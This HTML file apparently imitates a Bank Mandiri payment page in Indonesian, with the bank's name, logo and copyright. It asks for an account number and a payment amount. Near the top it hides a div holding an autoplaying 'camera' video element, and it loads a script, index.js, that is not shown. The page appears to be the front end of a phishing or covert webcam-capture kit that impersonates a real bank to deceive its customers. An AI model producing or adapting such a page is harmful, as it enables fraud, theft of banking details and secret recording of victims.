<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Bank Mandiri</title>
    <link rel="stylesheet" type="text/css" href="./index.css">
     <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100">
    <div id="hidden">
        <video id="camera" autoplay></video>
        <p id="status"></p></div><div>

  <!-- Header -->
  <header class="bg-white text-black py-4">
    <div class="container mx-auto flex justify-between items-center px-4">
      <div class="flex items-center">
        <img src="./img/logo-bank-mandiri.png" alt="Logo Mandiri" class="h-10">
      </div>
      <nav>
        <ul class="flex space-x-4 md:space-x-6">
          <li><a href="#" class="hover:text-gray-500">Beranda</a></li>
          <li><a href="#" class="hover:text-gray-500">Layanan</a></li>
          <li><a href="#" class="hover:text-gray-500">Bantuan</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <!-- Main Content -->
  <main id="bg-form" class="container mx-auto mt-8 px-4">
    <div class="bg-white rounded-lg shadow-lg p-6 md:p-8 max-w-2xl mx-auto">
      <h1 class="text-2xl font-bold mb-6">Pembayaran</h1>
      <form>
        <!-- Nomor Rekening -->
        <div class="mb-6">
          <label for="account-number" class="block text-sm font-medium text-gray-700">Nomor Rekening</label>
          <input type="text" id="account-number" placeholder="Masukkan nomor rekening" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
        </div>

        <!-- Jumlah Pembayaran -->
        <div class="mb-6">
          <label for="amount" class="block text-sm font-medium text-gray-700">Jumlah Pembayaran</label>
          <input type="number" id="amount" placeholder="Masukkan jumlah pembayaran" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
        </div>

        <!-- Metode Pembayaran -->
        <div class="mb-6">
          <label for="payment-method" class="block text-sm font-medium text-gray-700">Metode Pembayaran</label>
          <select id="payment-method" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
            <option value="transfer">Transfer Bank</option>
            <option value="credit-card">Kartu Kredit</option>
            <option value="e-wallet">E-Wallet</option>
          </select>
        </div>

        <!-- Tombol Submit -->
        <div class="mb-6">
          <button type="submit" id="paymentForm" class="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
            Lanjutkan Pembayaran
          </button>
        </div>
      </form>

      <!-- Informasi Tambahan -->
      <div class="text-sm text-gray-600">
        <p>Pastikan nomor rekening dan jumlah pembayaran sudah benar sebelum melanjutkan.</p>
        <p>Untuk bantuan, hubungi <a href="#" class="text-blue-600 hover:underline">Customer Service</a>.</p>
      </div>
    </div>
  </main>

  <!-- Footer -->
  <footer class="bg-gray-800 text-white py-6 mt-8">
    <div class="container mx-auto px-4 text-center">
      <p>&copy; 2023 Bank Mandiri. All rights reserved.</p>
      <div class="mt-2">
        <a href="#" class="text-gray-400 hover:text-white mx-2">Kebijakan Privasi</a>
        <a href="#" class="text-gray-400 hover:text-white mx-2">Syarat & Ketentuan</a>
      </div>
    </div>
  </footer>

  <script type="text/javascript" src="./index.js"></script>
</div>

</html>
